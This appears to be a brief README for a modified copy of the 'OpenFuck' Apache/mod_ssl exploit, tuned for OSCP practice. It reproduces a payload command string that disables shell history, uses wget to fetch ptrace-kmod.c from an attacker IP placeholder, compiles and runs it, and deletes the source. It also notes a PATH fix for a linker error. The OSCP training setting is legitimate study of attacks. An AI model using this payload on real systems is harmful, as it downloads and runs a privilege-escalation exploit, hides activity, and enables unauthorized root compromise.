# openfuck_oscp
modified the code on line 671

#define COMMAND2 "unset HISTFILE; cd /tmp;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin; wget http://enter ur ip here/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c; rm ptrace-kmod.c; ./exploit; \n"

added the lines export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin to overcome ld error
